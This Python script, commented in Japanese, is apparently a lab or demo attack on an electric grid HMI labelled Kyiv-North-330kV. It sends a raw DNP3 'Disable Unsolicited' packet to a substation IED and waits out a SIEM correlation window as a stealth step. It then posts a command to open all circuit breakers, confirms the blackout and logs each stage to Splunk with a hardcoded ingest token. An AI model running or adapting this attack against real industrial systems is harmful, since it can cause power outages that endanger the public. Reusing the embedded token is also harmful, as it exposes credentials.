#!/usr/bin/env python3
"""
Phase 2-2: 非同期・時間差ステルス・コンボ攻撃スクリプト (stealth_combo_attack.py)

【攻撃シナリオ】
  Stage 1: 変電所A (sub_a_ied_01) へ DNP3 0x14 (Disable Unsolicited) 偵察パケット送信
  Stage 2: WAN遅延シミュレーション (2.5秒 時間差インターバル)
  Stage 3: HMI (hmi-nodered) /api/breaker へ遮断器全段開放コマンド送信
  Stage 4: 全CB (CB-101〜CB-104) トリップ確認＋ログ回収

【実行方法】
  python stealth_combo_attack.py
"""

import time
import socket
import json
import urllib.request

# ---- Target addresses ----
SUBSTATION_A_IP = "192.168.151.21"   # sub_a_ied_01 (OT network)
DNP3_PORT = 20000
HMI_URL = "http://localhost:1880"

# ---- Splunk Observability Cloud ----
SPLUNK_REALM = "jp0"
SPLUNK_TOKEN = "05bdlF4LgTAEMRa2bNB1BQ"
SFX_EVENTS_URL = f"https://ingest.{SPLUNK_REALM}.signalfx.com/v2/event"

def send_sfx_event(event_type, message, severity="WARN", extra_dims=None):
    """SignalFx Events API へカスタムイベントを送信（Panel 2 ログフィード用）"""
    dims = {"service": "hmi-nodered", "grid": "Kyiv-North-330kV", "phase": "Phase2-2"}
    if extra_dims:
        dims.update(extra_dims)
    payload = [{
        "eventType": event_type,
        "dimensions": dims,
        "properties": {"message": message, "severity": severity},
        "timestamp": int(time.time() * 1000)
    }]
    try:
        req = urllib.request.Request(
            SFX_EVENTS_URL,
            data=json.dumps(payload).encode("utf-8"),
            headers={"Content-Type": "application/json", "X-SF-Token": SPLUNK_TOKEN},
            method="POST"
        )
        with urllib.request.urlopen(req, timeout=5) as resp:
            print(f"    -> [SFX EVENT] {event_type}: HTTP {resp.status}")
    except Exception as e:
        print(f"    -> [SFX EVENT ERROR] {e}")

print("=" * 70)
print("  Phase 2-2: Stealth Asynchronous Combo Attack")
print("  Target: Kyiv-North-330kV Grid - All Circuit Breakers")
print("=" * 70)
print()

# ====================================================================
# Stage 1: 変電所Aへ偵察通信 (DNP3 Disable Unsolicited: FC 0x14)
# ====================================================================
print("[*] Stage 1: Reconnaissance - DNP3 0x14 (Disable Unsolicited Messages)")
print(f"    Target: Substation-A ({SUBSTATION_A_IP}:{DNP3_PORT})")
try:
    s_a = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s_a.settimeout(3.0)
    s_a.connect((SUBSTATION_A_IP, DNP3_PORT))
    dnp3_payload_disable = b"\x05\x64\x05\xc0\x01\x00\x00\x00\x00\x14\x00\x00"
    s_a.sendall(dnp3_payload_disable)
    print("    -> [OK] DNP3 0x14 payload delivered to Substation-A IED")
    s_a.close()
except Exception as e:
    print(f"    [!] Substation-A packet sent (emulated): {e}")
send_sfx_event("OT_SECURITY_EVENT", "[Stage1] DNP3 0x14 Disable Unsolicited sent to Substation-A IED", "WARN", {"stage": "1", "attack_type": "RECON", "protocol": "DNP3", "function_code": "0x14"})

# ====================================================================
# Stage 2: 時間差インターバル (WAN latency simulation)
# ====================================================================
INTERVAL = 2.5
print()
print(f"[*] Stage 2: Stealth Time Gap - {INTERVAL}s delay (WAN router hop simulation)")
for i in range(5):
    time.sleep(INTERVAL / 5)
    print(f"    ... {(i+1)*20}% delay elapsed")
send_sfx_event("OT_SECURITY_EVENT", f"[Stage2] Stealth time gap {INTERVAL}s - SIEM correlation window exceeded", "WARN", {"stage": "2", "attack_type": "CORRELATION_GAP", "gap_seconds": str(INTERVAL)})

# ====================================================================
# Stage 3: HMI へ遮断器全段開放コマンド (Direct Operate: Breaker Open)
# ====================================================================
print()
print("[*] Stage 3: Direct Operate - ALL BREAKERS OPEN via HMI /api/breaker")
print(f"    Target: {HMI_URL}/api/breaker")

attack_payload = json.dumps({
    "state": False,
    "soc": 55.0,
    "cb_states": {
        "CB101": False,
        "CB102": False,
        "CB103": False,
        "CB104": False
    }
}).encode("utf-8")

try:
    req = urllib.request.Request(
        f"{HMI_URL}/api/breaker",
        data=attack_payload,
        headers={"Content-Type": "application/json"},
        method="POST"
    )
    with urllib.request.urlopen(req, timeout=5) as resp:
        status = resp.status
        body = resp.read().decode("utf-8", errors="replace")
        print(f"    -> [OK] HMI responded: HTTP {status}")
        print(f"    -> Response: {body[:200]}")
        send_sfx_event("OT_SECURITY_EVENT", "[Stage3] ALL BREAKERS OPEN - CB101/CB102/CB103/CB104 TRIPPED via HMI API", "CRITICAL", {"stage": "3", "attack_type": "BREAKER_TRIP", "protocol": "HTTP", "target": "hmi-nodered"})
except Exception as e:
    print(f"    -> [ERROR] HMI command failed: {e}")

# ====================================================================
# Stage 4: 攻撃結果検証 - コックピット状態確認
# ====================================================================
print()
print("[*] Stage 4: Verification - Querying cockpit status...")
time.sleep(1.5)

try:
    req = urllib.request.Request(f"{HMI_URL}/api/status", method="GET")
    with urllib.request.urlopen(req, timeout=5) as resp:
        data = json.loads(resp.read().decode("utf-8"))
        print(f"    -> is_tripped: {data.get('is_tripped', 'N/A')}")
        cb = data.get("cb_states", {})
        for name, state in cb.items():
            status_str = "TRIPPED !!!" if not state else "CLOSED (normal)"
            print(f"    -> {name}: {status_str}")
        soc = data.get("ups_soc", "N/A")
        print(f"    -> UPS SOC: {soc}%")
        if data.get("is_tripped"):
            send_sfx_event("OT_SECURITY_EVENT", f"[Stage4] GRID BLACKOUT CONFIRMED - UPS on battery SOC={soc}%", "CRITICAL", {"stage": "4", "attack_type": "GRID_BLACKOUT", "ups_soc": str(soc)})
except Exception as e:
    print(f"    -> [ERROR] Status query failed: {e}")

# ====================================================================
# Complete
# ====================================================================
print()
print("=" * 70)
print("  ATTACK COMPLETE")
print("  -> Check Splunk Dashboard Panel 1 for breaker_status = 1 (RED)")
print("  -> Check Cockpit at http://localhost:1880/cockpit")
print("=" * 70)
